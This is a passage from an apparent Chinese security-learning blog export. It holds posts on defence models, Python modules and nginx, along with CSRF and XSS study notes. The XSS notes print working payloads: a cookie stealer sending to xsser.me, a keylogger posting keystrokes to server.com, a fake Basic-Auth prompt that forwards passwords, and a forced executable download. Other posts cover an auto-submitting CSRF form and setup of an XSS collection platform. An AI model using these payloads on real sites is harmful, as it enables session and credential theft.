https://openresty.org/cn/installation.html","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"2-常见防御体系","slug":"2-常见防御体系","date":"2018-06-18T12:19:01.000Z","updated":"2018-06-20T15:51:24.330Z","comments":true,"path":"2018/06/18/2-常见防御体系/","link":"","permalink":"http://yoursite.com/2018/06/18/2-常见防御体系/","excerpt":"","text":"名词解释 IDS： IDS是英文“Intrusion Detection Systems”的缩写，中文意思是“入侵检测系统”。 专业上讲就是依照一定的安全策略，通过软、硬件，对网络、系统的运行状况进行监视， 尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性。 做一个形象的比喻： 假如防火墙是一幢大楼的门锁，那么IDS就是这幢大楼里的监视系统。一旦小偷爬窗进入大楼，或内部人员有越界行为，只有实时监视系统才能发现情况并发出警告。 IPS 入侵防御系统(IPS: Intrusion Prevention System)是电脑网络安全设施，是对防病毒软件（Antivirus Programs）和防火墙(Packet Filter, Application Gateway)的补充。 入侵防御系统(Intrusion-prevention system)是一部能够监视网络或网络设备的网络资料传输行为的计算机网络安全设备，能够即时的中断、调整或隔离一些不正常或是具有伤害性的网络资料传输行为。 UTM UTM是对传统防护手段的整合和升华，是建立在原有安全网关设备基础之上的，拥有防火墙、入侵防御(IPS)、防病毒(AV)、VPN、内容过滤、反垃圾邮件等多种功能，这些技术处理方式仍然是UTM的基础，但这些处理方式不再各自为战，需要在统一的安全策略下相互配合，协同工作。 对于众多的功能，有必备功能和增值功能之分。一般而言，防火墙、VPN、入侵防御、防病毒是必备的功能模块，缺少任何一个不能称之为UTM。其余是增值功能，用户可以根据自身需求进行选择。 web威胁感知 识别Web应用攻击，能够深度挖掘黑客针对Web的拖库、远程命令执行、敏感文件泄露、Webshell后门等攻击事件并发出准确的报警 常见的防御体系 边界防护 123456789101112&quot;在网络边界解决问题，强调御敌于国门之外&quot;主要措施：a. WAFb. 内外网隔离优点：部署简单缺点：内网突破后，黑客就控制了一切。 纵深防御体系 12345678910111213&quot;纵深防御本质为多层防御，增加攻击成本。&quot;纵深防御分为四部分：a. 网络边界：WAF，防火墙，IPS，UTM，流量清洗设备等等b. 网络层：IDS，web威胁感知，web审计c. 服务器端：主机IDS，服务器杀毒，内核假哭，主机WAF等d. 数据库：数据库审计，数据库防火墙等优点：防护的定位清晰，攻击成本提高，安全性提高缺点：各个部分缺乏协同性，检测手段多基于黑名单和规则，对于专业的黑客而言，也是可以突破的。 河防体系 在隔离的基础上，严格控制办公网络对生产网络的访问，同时在生产网络的内部进行隔离的基础上，进行边界防护和检测。适用于数据中心用户 塔防体系 纵深防御的一种，加上了云的管控能力和威胁情报数据。 参考 https://anquan.baidu.com/pages/threat.html https://searchsecurity.techtarget.com.cn/11-17666/ https://baike.baidu.com/item/IPS/2131631 https://zh.wikipedia.org/wiki/入侵检测系统 https://baike.baidu.com/item/IDS/22042","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"1-企业安全建设入门","slug":"1-企业安全建设入门","date":"2018-06-18T12:18:46.000Z","updated":"2018-06-20T15:51:18.450Z","comments":true,"path":"2018/06/18/1-企业安全建设入门/","link":"","permalink":"http://yoursite.com/2018/06/18/1-企业安全建设入门/","excerpt":"","text":"两个概念 PDR： 12345678protection（保护）：加密，认证，访问控制，防火墙，杀毒软件等等detection（检测）：入侵检测，漏洞扫描等response（应急响应）：建立应急响应机制，形成对安全的及时响应能力等 P2DR 12345678910protectionDetectionResponsePolice建立在PDR的基础上，多了一个Police（根据风险分析产生的安全策略），其中Police是模型的核心。着重于描述：系统中哪些资源需要保护？如何实现对它们的保护？","categories":[{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/categories/企业安全建设/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"企业安全建设","slug":"企业安全建设","permalink":"http://yoursite.com/tags/企业安全建设/"}]},{"title":"CSRF攻击学习","slug":"CSRF攻击学习","date":"2018-06-14T15:26:27.000Z","updated":"2018-06-24T12:56:09.279Z","comments":true,"path":"2018/06/14/CSRF攻击学习/","link":"","permalink":"http://yoursite.com/2018/06/14/CSRF攻击学习/","excerpt":"","text":"概述 一图胜千言 攻击方式 GET方式 假如现在有一个链接： https://csrf.com/m?addUser=id12345 那么我们就可以构造一个图片 1&lt;img src=&apos;https://csrf.com/m?addUser=id12345&apos;&gt; 只要你访问我的网站，那么就会触发这个链接，从而关注了我 POST方式 POST的请求经常伴随着跳转，一跳转，就会暴露，这个时候我们就要考虑加一个iframe。 但是在csrf测试的页面加iframe，根据同源政策，显示不来内容。于是我们新建另一个页面，加上iframe，连接到csrf的测试页面。如下： 新建一个iframe 123456&lt;html&gt; &lt;head&gt;&lt;/head&gt; &lt;body&gt; &lt;iframe style=&quot;display:block&quot; src=&apos;test.html&apos;&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 在建一个test.html 123456789101112131415&lt;!DOCTYPE HTML&gt;&lt;html lang=\"en-US\"&gt;&lt;head&gt;&lt;title&gt;CSRF GET&lt;/title&gt;&lt;body&gt; &lt;form name=\"form1\" action=\"http://127.0.0.1:5000/csrf\" method=\"post\"&gt; &lt;input type='hidden' name='username' value=\"csrf_ee1\"&gt; &lt;input type=\"hidden\" name=\"password\" value=\"qwe1231\"/&gt; &lt;input type=\"submit\" value&gt; &lt;/form&gt; &lt;script&gt; document.forms.form1.submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这样一来，成功复现了csrf 什么叫做XSRF？ XSRF指的是xss+csrf的攻击，指的是一个网站既有xss又有csrf。 这样一来就可以进行两者的结合，通过xss注入csrf的html代码。 通过js生成代码 123456&lt;script&gt; var iframe = document.createElement('iframe'); iframe.style.display = 'none'; iframe.src='test.html'; document.body.appendChild(iframe);&lt;/script&gt; 总结 csrf总的来说，主要聚焦于写，并不会窃取用户的数据。","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"CSRF","slug":"CSRF","permalink":"http://yoursite.com/tags/CSRF/"}]},{"title":"xss攻击学习","slug":"xss攻击学习","date":"2018-06-14T15:12:45.000Z","updated":"2018-06-24T04:39:33.583Z","comments":true,"path":"2018/06/14/xss攻击学习/","link":"","permalink":"http://yoursite.com/2018/06/14/xss攻击学习/","excerpt":"","text":"概念 xss 全称为 cross site scripting. 特指攻击者利用网站对于用户输入过滤不足的缺陷，输入可以对用户造成影响的html/js代码，从而窃取用户信息，进行病毒侵害等行为。 类型 反射型 将用户输入的数据通过url的形式直接或未经完善过滤就在浏览器中输出，导致浏览器执行了用户输入的代码数据 存储型 程序将用户输入的数据信息保存在了服务器端（如数据库），网页在查询数据时候，从中获取了畸形数据内容，在网页进行展示。造成xss DOM型 反射型xss的一种，不同点在于，注入的方式是根据js的DOM进行分析并注入,较为少见。 攻击 盗取cookies 简单的： 12345678910#jsDocument.location=&apos;https://www.xsser.me/cookies.php?cookie=&apos;+document.cookie;#php&lt;?php$cookie = $_GET[&apos;cookie&apos;];$log = fopen(&quot;cookies.txt&quot;,&quot;a&quot;);Fwrite($log,$cookie.&quot;&quot;\\n&quot;)Fclose($log)?&gt; 复杂的： 12345678910111213141516171819202122232425262728293031(function() &#123; (new Image()).src = &apos;http://xsser.me/index.php?do=api&amp;id=RAMWD1&amp;location=&apos; + escape((function() &#123; try &#123; return document.location.href &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;toplocation=&apos; + escape((function() &#123; try &#123; return top.location.href &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;cookie=&apos; + escape((function() &#123; try &#123; return document.cookie &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)()) + &apos;&amp;opener=&apos; + escape((function() &#123; try &#123; return (window.opener &amp;&amp; window.opener.location.href) ? window.opener.location.href : &apos;&apos; &#125; catch (e) &#123; return &apos;&apos; &#125; &#125;)());&#125;)();if (&apos;&apos; == 1) &#123; keep = new Image(); keep.src = &apos;http://xsser.me/index.php?do=keepsession&amp;id=RAMWD1&amp;url=&apos; + escape(document.location) + &apos;&amp;cookie=&apos; + escape(document.cookie)&#125;; 读取用户键盘输入 123456789101112131415161718192021222324252627#!js$(document).ready(function()&#123; var server = &quot;http://server.com/&quot;; //接收服务器 var gate = &quot;data.php?data=&quot;; //接收文件 var tabURL = window.location.href; var keys=&apos;&apos;; document.onkeypress = function(e) &#123; get = window.event?event:e; key = get.keyCode?get.keyCode:get.charCode; key = String.fromCharCode(key); keys+=key; &#125; window.setInterval(function()&#123; new Image().src = server+gate+keys; keys = &apos;&apos;; &#125;, 1000); &#125;);#!php&lt;?php$txt = $_GET[&apos;data&apos;];$log = fopen(&quot;keylog.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;);fwrite($log, $txt);fclose($log);?&gt; 网络钓鱼攻击 123456789101112131415161718192021222324252627282930# html&lt;html&gt; &lt;body&gt; &lt;script src=&quot;http://192.168.31.63/authtest.php?id=RAMWD1&amp;info=age%2Cmonth&quot;&gt; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;#php&lt;?error_reporting(0);if ((!isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) || (!isset($_SERVER[&apos;PHP_AUTH_PW&apos;]))) &#123; header(&apos;WWW-Authenticate: Basic realm=&quot;&apos;.addslashes(trim($_GET[&apos;info&apos;])).&apos;&quot;&apos;); header(&apos;HTTP/1.0 401 Unauthorized&apos;); echo &apos;Authorization Required.&apos;; exit;&#125; else if ((isset($_SERVER[&apos;PHP_AUTH_USER&apos;])) &amp;&amp; (isset($_SERVER[&apos;PHP_AUTH_PW&apos;])))&#123; header(&quot;Location: http://192.168.31.63/index.php?do=api&amp;id=&#123;$_GET[id]&#125;&amp;username=&#123;$_SERVER[PHP_AUTH_USER]&#125;&amp;password=&#123;$_SERVER[PHP_AUTH_PW]&#125;&quot;); &#125;?&gt; Beef框架 BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. xss蠕虫 其实是CSRF和xss的结合。利用XHR，另找时间研究学习一下。 强制软件下载 12345678910111213#!php$(document).ready(function()&#123; var server = &quot;http://server.com/&quot;; //服务器 var gate = &quot;/test/test.exe&quot;; //要下载的文件 var tabURL = window.location.href; var link = document.createElement(&apos;a&apos;); link.href = server+gate; link.download = &apos;&apos;; document.body.appendChild(link); link.click(); &#125;);","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-os.path","slug":"python模块-os-path","date":"2018-06-14T14:02:49.000Z","updated":"2018-06-20T15:53:54.855Z","comments":true,"path":"2018/06/14/python模块-os-path/","link":"","permalink":"http://yoursite.com/2018/06/14/python模块-os-path/","excerpt":"","text":"概述 涉及到文件和文件夹的操作的一般有三个模块 os os.path shutil os.path os.path 模块，顾名思义就是针对于系统的文件路径啊，判断是否为文件啊等等行为做出处理的模块。 os.path.abspath(path) 返回当前绝对路径+path参数的字符 123456&gt;&gt;&gt; os.path.abspath(&apos;.&apos;)&apos;/Users/xxxx&apos;&gt;&gt;&gt; os.path.abspath(&apos;~&apos;)&apos;/Users/xxxx/~&apos;&gt;&gt;&gt; os.path.abspath(&apos;logs&apos;)&apos;/Users/xxxx/logs&apos; os.path.basename(path) 返回路径下面的文件名的字符串。(这个文件路径可能不存在) 12&gt;&gt;&gt; os.path.basename(&apos;/user/johnw/test.txt&apos;)# &apos;test.txt&apos; os.path.commonpath([path1,path2]) 接受一个序列，得到两个字符串中相同的文件路径（一定要是路径字符串） 12&gt;&gt;&gt; os.path.commonpath([&apos;/user/johnw/log.txt&apos;,&apos;/user/johnw/logs/test.txt&apos;])&apos;/user/johnw&apos; os.path.commonprefix([path1,path2]) 顾名思义，接受路径字符的序列，比较前缀 12345&gt;&gt;&gt; os.path.commonprefix([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])&apos;/usr/l&apos;&gt;&gt;&gt; os.path.commonpath([&apos;/usr/lib&apos;, &apos;/usr/local/lib&apos;])&apos;/usr&apos; os.path.dirname(path) 返回路径字符串中的关于文件夹的路径 12345&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/&apos;)&apos;/usr/local/src&apos;&gt;&gt;&gt; os.path.dirname(&apos;/usr/local/src/test.txt&apos;)&apos;/usr/local/src&apos; os.path.exists(path) 判断文件路径是否真实存在 123456&gt;&gt;&gt; os.path.exists(&apos;/usr/local/src&apos;)False&gt;&gt;&gt; os.path.exists(&apos;/usr/local&apos;)True&gt;&gt;&gt; os.path.exists(&apos;/usr/local/sbin&apos;)True os.path.expanduser(path) 把path中包含的&quot;&quot;和&quot;user&quot;转换成用户目录 12&gt;&gt;&gt; os.path.expanduser(&apos;~&apos;)&apos;/Users/xxx&apos; os.path.expandvars(path) 根据环境变量，替换路径存在的$name 和 ${name} 的值 12&gt;&gt;&gt; os.path.expandvars(&apos;$PYENV_ROOT&apos;)&apos;/Users/xxx/.pyenv&apos; os.path.getatime(path) os.path.getmtime(path) os.path.getctime(path) 1234567891011121314文件的 Access time，atime 是在读取文件或者执行文件时更改的任何对inode的访问都会使此处改变。文件的Modified time，mtime 是在写入文件时随文件内容的更改而更改的。文件的 Change time，ctime 是在写入文件、更改所有者、权限或链接设置时随 Inode 的内容更改而更改的。只要stat出来的内容发生改变就会发生改变。mtime的改变必然导致ctime的改变。文件夹的 Access time，atime 是在读取文件或者执行文件时更改的（我们只cd进入一个目录然后cd ..不会引起atime的改变，但ls一下就不同了）。文件夹的 Modified time，mtime 是在文件夹中有文件的新建、删除才会改变文件夹的 Change time，ctime 基本同文件的ctime，其体现的是inode的change time。&gt;&gt;&gt; os.path.getatime(&apos;/Users/xxxx/demo.py&apos;)1524670536.2193816 os.path.getsize(path) 得到文件的大小。 以bytes为单位。如果不存在或者路径错误，返回OSError 12345[21:31:34] xxx ➜ ~» ls -hl demo.py -rw-r--r-- 1 xxxx staff 21B Apr 25 23:35 demo.py&gt;&gt;&gt; os.path.getsize(&apos;/Users/wenzhongwei/demo.py&apos;)21 os.path.isabs(path) 如果是绝对路径，返回True 12&gt;&gt;&gt; os.path.isabs(&apos;/user&apos;)True os.path.isfile(path) os.path.isdir(path) os.path.islink(path) os.path.ismount(path) 顾名思义，判断语句.会先判断这个路径字符是否真实存在，如果不存在，返回False 1234&gt;&gt;&gt; os.path.isfile(&apos;/user/text.txt&apos;)False&gt;&gt;&gt; os.path.isfile(&apos;/Users/xxx/demo.py&apos;)True os.path.join(path) 将字符拼接成合适的字符路径 12345678910&gt;&gt;&gt; os.path.join(&apos;usr&apos;,&apos;src&apos;)&apos;usr/src&apos;&gt;&gt;&gt; os.path.join(&apos;/usr&apos;,&apos;src&apos;)&apos;/usr/src&apos;&gt;&gt;&gt; os.path.join(&apos;C:&apos;,&apos;src&apos;)&apos;C:/src&apos;&gt;&gt;&gt; os.path.join(&apos;c:&apos;,&apos;src&apos;)&apos;c:/src&apos;&gt;&gt;&gt; os.path.join(&apos;test&apos;,&apos;.src&apos;)&apos;test/.src&apos; os.path.normcase(path) os.path.normpath(path) 格式化字符路径，使之符合当前系统格式 12&gt;&gt;&gt; os.path.normcase(&apos;/User/local&apos;)&apos;/User/local&apos; os.path.realpath(path) 返回字符路径的真实路径 12&gt;&gt;&gt; os.path.realpath(&apos;.&apos;)&apos;/Users/xxx&apos; os.path.relpath(path) 返回相对路径 12&gt;&gt;&gt; os.path.relpath(&apos;/Users/xxx&apos;)&apos;.&apos; os.path.samefile(path1,path2) 如果两个文件名都是指向同一个文件的话，返回True，this is determined by the device number and i-node number os.path.sameopenfile(fp1,fp2) os.path.split(path) 切割成 路径 ， 文件名 12&gt;&gt;&gt; os.path.split(&apos;/usr/local/test.txt&apos;)(&apos;/usr/local&apos;, &apos;test.txt&apos;) os.path.splitext(path) 切割成路径 ， 后缀名 12&gt;&gt;&gt; os.path.splitext(&apos;/usr/local/test.txt&apos;)(&apos;/usr/local/test&apos;, &apos;.txt&apos;) os.path.supports_unicode_filename","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"XSS平台的搭建","slug":"XSS平台的搭建","date":"2018-06-14T12:20:09.000Z","updated":"2018-06-24T04:39:38.681Z","comments":true,"path":"2018/06/14/XSS平台的搭建/","link":"","permalink":"http://yoursite.com/2018/06/14/XSS平台的搭建/","excerpt":"","text":"lnmp环境搭建 下载 123456https://lnmp.org/download.htmltar -zxvf lnmp1.5-full.tar.gz./install.sh lnmp或者./install.sh lamp XSS平台 1234567891011121314151. 下载xss平台https://git.oschina.net/nMask/Resource/raw/master/xss.me.new.zip2. 数据库配置打开phpmyadmin，新建数据库 poppy将解压出来的xss.sql移动到 phpmyadmin/upload 目录下面在phpmyadmin选择导入，执行。成功导入数据库3.config.php$config[&apos;register&apos;] = &apos;normal&apos; //invite需要邀请码$config[&apos;dBPwd&apos;]=&apos;xxx&apos;$config[&apos;urlroot&apos;] = 192.168.31.xx xss_url 为404 nginx 的解决方式 通过转换.htaccess: http://www.anilcetin.com/convert-apache-htaccess-to-nginx/ 将转换后的内容写入/usr/local/nginx/config/my.conf 123456location / &#123; rewrite &quot;^/([0-9a-zA-Z]&#123;6&#125;)$&quot; /index.php?do=code&amp;urlKey=$1 last; rewrite ^/do/auth/(w+?)(/domain/([w.]+?))?$ /; rewrite ^/register/(.*?)$ /index.php?do=register&amp;key=$1 last; rewrite ^/register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 last;&#125; apache的解决方式,新增 .htaccess 12345678&lt;IfModule mod_rewrite.c&gt;RewriteEngine OnRewriteBase /RewriteRule ^([0-9a-zA-Z]&#123;6&#125;)$ /index.php?do=code&amp;urlKey=$1 [L] RewriteRule ^do/auth/(w+?)(/domain/([w.]+?))?$ /index.php?do=do&amp;auth=$1&amp;domain=$3 [L] RewriteRule ^register/(.*?)$ /index.php?do=register&amp;key=$1 [L] RewriteRule ^register-validate/(.*?)$ /index.php?do=register&amp;act=validate&amp;key=$1 [L]&lt;/IfModule&gt; 然后修改apache的配置 1AllowOverride None ==&gt; AllowOverride All Reference https://thief.one/2017/03/15/Xss平台搭建小记/ https://zhuanlan.zhihu.com/p/27020543","categories":[{"name":"web_security","slug":"web-security","permalink":"http://yoursite.com/categories/web-security/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"security","slug":"security","permalink":"http://yoursite.com/tags/security/"},{"name":"xss","slug":"xss","permalink":"http://yoursite.com/tags/xss/"}]},{"title":"python模块-subprocess","slug":"python模块-subprocess","date":"2018-06-13T00:31:54.000Z","updated":"2018-06-20T15:53:34.865Z","comments":true,"path":"2018/06/13/python模块-subprocess/","link":"","permalink":"http://yoursite.com/2018/06/13/python模块-subprocess/","excerpt":"","text":"概述 subprocess 允许你启动一个新的进程，连接到这个进程的输入，输出，错误的管道中，取得返回的值。用于执行一些系统的命令 代码结构及其实例 run 官方推荐其使用 run 方法。这是一个封装好的subprocess方法, 返回一个CompleteProcess 实例 1subprocess.run(args, *, stdin=None, input=None, stdout=None, stderr=None, shell=False, cwd=None, timeout=None, check=False, encoding=None, errors=None) 代码1： 12345import subprocess# 运行后不会有输出a = subprocess.run(&apos;ls -al&apos;,shell=True,stdout=subprocess.PIPE)# 输出a.stdout 代码2： 12345678import subprocessb = subprocess.run([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)b.stdoutCompleteProcess对象有以下参数：args: 用于执行的命令，比如 ls -al, [&apos;ls&apos;,&apos;-al&apos;]returnCode: 退出进程后，返回值stdout: 命令输出stderr: 命令错误时输出 subprocess构造函数 1class subprocess.Popen(args, bufsize=-1, executable=None, stdin=None, stdout=None, stderr=None, preexec_fn=None, close_fds=True, shell=False, cwd=None, env=None, universal_newlines=False, startupinfo=None, creationflags=0, restore_signals=True, start_new_session=False, pass_fds=(), *, encoding=None, errors=None) 常见代码1： 12345test = subprocess.Popen([&apos;ls&apos;,&apos;-al&apos;],stdout=subprocess.PIPE)# test.stdout 返回一个&lt;_io.BufferedReader name=3&gt;test.stdiyt.read() # 读取输出注： 必须要有 stdout=subprocess.PIPE 否则不会有输出。 与命令交互： 1Popen.communicate(input=None,timeout=None) # (stdout_data,stderr_data)","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"python模块 - re","slug":"python模块-re","date":"2018-06-13T00:30:57.000Z","updated":"2018-06-20T15:53:47.186Z","comments":true,"path":"2018/06/13/python模块-re/","link":"","permalink":"http://yoursite.com/2018/06/13/python模块-re/","excerpt":"","text":"概述 正则表达式是处理字符串的强大的工具，检索字符串，替换，匹配验证等等。 常用的匹配规则 123456789\\w 匹配字母，数字和下划线\\d 匹配数字\\s 匹配任何空白字符\\z 匹配字符串结尾，如果有换行符，一起匹配\\n 匹配换行\\t 匹配制表符^ 匹配开头$ 匹配结尾. 匹配任何字符，除了换行符，除非指定re.DOTALL python的re模块 注： .*? 遇到换行符就不管用了，除非加上re.S match match 尝试从字符串开头开始匹配正则表达式，如果成功就返回，如果没有就返回一二None 12345678910111213&gt;&gt;&gt; import re&gt;&gt;&gt; a = &quot;Hello World&quot;&gt;&gt;&gt; b = re.match(&apos;\\w+\\s&apos;,a,re.S)&gt;&gt;&gt; b&lt;_sre.SRE_Match object; span=(0, 6), match=&apos;Hello &apos;&gt;&gt;&gt;&gt; b.span()(0, 6)&gt;&gt;&gt; b.group()&apos;Hello &apos;&gt;&gt;&gt; b.group(0)&apos;Hello &apos;None 是false search 扫描整个字符串，如果符合就返回，否则返回none 1234567&gt;&gt;&gt; import re&gt;&gt;&gt; a = &quot;Hello World&quot;&gt;&gt;&gt; c = re.search(&apos;\\s\\w+&apos;,a)&gt;&gt;&gt; c&lt;_sre.SRE_Match object; span=(5, 11), match=&apos; World&apos;&gt;&gt;&gt;&gt; c.group()&apos; World&apos; findall 当需要提取全部匹配的内容，需要使用findall，使用search只能取回第一个。如果在匹配的时候用括号指定了，那么返回中的列表就会包含元祖 123&gt;&gt;&gt; d = re.findall(r&apos;He(l)l(o)&apos;,a)&gt;&gt;&gt; d[(&apos;l&apos;, &apos;o&apos;)] sub 替换文本,返回替换好的字符串 1re.sub(&apos;\\s\\w+&apos;,&apos;johnw&apos;,a)","categories":[{"name":"python_modules","slug":"python-modules","permalink":"http://yoursite.com/categories/python-modules/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"}]},{"title":"Linux - Nginx","slug":"Linux-Nginx","date":"2018-06-09T13:22:07.000Z","updated":"2018-06-24T02:20:31.534Z","comments":true,"path":"2018/06/09/Linux-Nginx/","link":"","permalink":"http://yoursite.com/2018/06/09/Linux-Nginx/","excerpt":"","text":"nginx做为静态服务器和反向代理服务器 安装nginx 1234567891011121314151617181920212223# 查看nginx版本,内核需要2.6以上uname -a#安装gccyum install gcc gcc-c++ pcre-devel zlib zlib-devel openssl openssl-develgcc 编译cgcc-c++ 编译c++pcre-devel 解析perl正则zlib 用于压缩zlib-devel 用于开发openssl 用于ssl加密#安装nginx./configuremakemake install#configure配置选项--prefix=PATH 安装部署后的根目录--sbin-path 可执行文件的放置路径 基于前面的prefix &lt;prefix&gt;/sbin/nginx--conf-path 放置配置文件 &lt;prefix&gt;/conf/nginx.conf--error-log-path &lt;prefix&gt;/logs/errors.log 启动nginx 12./usr/local/sbin/nginx -s stop / reload -c xxx.conf 将nginx做为静态服务器 case: 123456server &#123; location ^~ /static&#123; alias usr/local/nginx/conf &#125;&#125; 明确root和alias的不同 1234567891011121314151617# rootlocation conf &#123; root usr/local/nginx;&#125;# aliaslocation conf &#123; alias usr/local/nginx/conf;&#125;alias 要指定到具体的一层文件夹root 会根据url来映射文件夹比如：http://www.xxx.com/conf/test.html alias的处理 匹配location为conf的规则，将配置的文件夹直接返回给用户root的处理：匹配到location为conf的规则，提取/conf/test.html 拼接到已配置的文件夹下面 将nginx做为反向代理服务器 12345678910111213# 在nginx.conf里面的http模块里面加入include &apos;/usr/local/nginx/conf/nginx2.conf&apos;vim nginx2.confupstream xxx&#123; server 112.11.11.11:8080;&#125;server&#123; server_name www.xxx.com; location / &#123; proxy_pass http://xxx; &#125;&#125; 如何做好负载均衡？ 12345upstream xxx&#123; server 111.111.111.111 weight=5(权重，优先转发); server 222.222.222.222 max_fails=3 fail_timeout=30s(失败3次，30s); server 333.333.333.333 down(下线);&#125;","categories":[{"name":"Nginx","slug":"Nginx","permalink":"http://yoursite.com/categories/Nginx/"}],"tags":[{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"}]},{"title":"Hello World","slug":"hello-world","date":"2018-06-09T06:58:25.169Z","updated":"2018-06-09T13:15:20.126Z","comments":true,"path":"2018/06/09/hello-world/","link":"","permalink":"http://yoursite.com/2018/06/09/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick Start Create a new post 1$ hexo new \"My New Post\" More info: Writing Run server 1$ hexo server More info: Server Generate static files 1$ hexo generate More info: Generating Deploy to remote sites 1$ hexo deploy More info: Deployment","categories":[{"name":"test","slug":"test","permalink":"http://yoursite.com/categories/test/"}],"tags":[]}]}